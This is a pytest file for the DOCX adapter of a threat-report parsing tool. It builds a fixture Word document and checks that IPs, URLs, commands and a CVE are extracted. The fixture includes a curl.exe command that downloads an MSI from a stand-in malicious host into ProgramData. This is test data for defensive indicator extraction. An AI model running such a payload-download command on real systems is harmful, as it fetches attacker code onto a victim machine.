"""Phase 3A · DOCX adapter contract tests + Adapter Manifest tests.

Uses python-docx at test time to synthesise a small Word document with
a hyperlink, paragraph text carrying an IP + URL + CVE, and a table.
"""
from __future__ import annotations

import io

import docx
import pytest

from models import IEP, RelationshipType
from services.adapters import DOCXAdapter, adapt


def _make_docx() -> bytes:
    d = docx.Document()
    d.core_properties.title = "NivXRay DOCX Fixture"
    d.core_properties.author = "e1"
    d.add_heading("Threat Report", level=1)
    d.add_paragraph("Callback IP 10.0.0.42 observed")
    d.add_paragraph(
        "curl.exe -o C:\\ProgramData\\a.msi https://mal.example/a.msi"
    )
    d.add_paragraph("Related CVE-2024-57727 exploitation.")
    tbl = d.add_table(rows=1, cols=2)
    tbl.rows[0].cells[0].text = "IOC"
    tbl.rows[0].cells[1].text = "example.com"
    buf = io.BytesIO()
    d.save(buf)
    return buf.getvalue()


DOCX_BYTES = _make_docx()


def test_docx_adapter_detects_docx_bytes():
    a = DOCXAdapter()
    assert a.can_handle(DOCX_BYTES)
    assert not a.can_handle(b"not a docx")
    assert not a.can_handle("string not bytes")


def test_docx_adapter_registered_and_routes_correctly():
    iep = adapt(DOCX_BYTES)
    assert iep.provenance.adapter == "adapter.docx"


def test_docx_adapter_extracts_body_artifacts():
    iep = DOCXAdapter().make_iep(DOCX_BYTES)
    ips  = iep.values_of("ip")
    urls = iep.values_of("url")
    cmds = iep.values_of("command")
    cves = iep.values_of("cve")
    assert "10.0.0.42" in ips
    assert any("mal.example/a.msi" in u for u in urls)
    assert any("curl.exe" in c for c in cmds)
    assert any("CVE-2024-57727" in c for c in cves)


def test_docx_source_ref_and_provenance_present():
    iep = DOCXAdapter().make_iep(DOCX_BYTES)
    assert iep.source.kind == "docx"
    assert iep.source.sha256
    for a in iep.artifacts:
        assert a.source_ref, f"{a.type}={a.value!r} missing source_ref"
        assert a.source_ref.startswith("docx."), a.source_ref


def test_docx_r8_relationships_only():
    iep = DOCXAdapter().make_iep(DOCX_BYTES)
    _ALLOWED = {
        RelationshipType.CONTAINS, RelationshipType.REFERENCES,
        RelationshipType.EMBEDS,   RelationshipType.ATTACHES,
    }
    for r in iep.relationships:
        assert r.verb in _ALLOWED, f"non-structural verb: {r.verb}"


def test_docx_metadata_and_manifest_surfaced():
    iep = DOCXAdapter().make_iep(DOCX_BYTES)
    md = iep.metadata.data
    assert md.get("docx", {}).get("document_props", {}).get("author") == "e1"
    # Adapter Manifest
    manifest = md.get("adapter") or {}
    assert manifest.get("name")    == "adapter.docx"
    assert manifest.get("version") == "1.0"
    assert "paragraphs" in (manifest.get("capabilities") or [])
    assert isinstance(manifest.get("warnings"), list)


# ── Adapter Manifest presence on every adapter ─────────────────────────
def test_every_adapter_emits_manifest():
    from services.adapters import PDFAdapter, TextAdapter
    for iep in [
        TextAdapter().make_iep("whoami\nhttps://x/y\n"),
    ]:
        m = iep.metadata.data.get("adapter") or {}
        assert m.get("name") and m.get("version"), \
            f"manifest missing on {iep.provenance.adapter}"
        assert isinstance(m.get("capabilities"), list) and m["capabilities"]
        assert isinstance(m.get("warnings"), list)


def test_docx_iep_json_roundtrip():
    iep = DOCXAdapter().make_iep(DOCX_BYTES)
    raw = iep.model_dump_json()
    back = IEP.model_validate_json(raw)
    assert back.provenance.adapter == "adapter.docx"
    assert len(back.artifacts) == len(iep.artifacts)
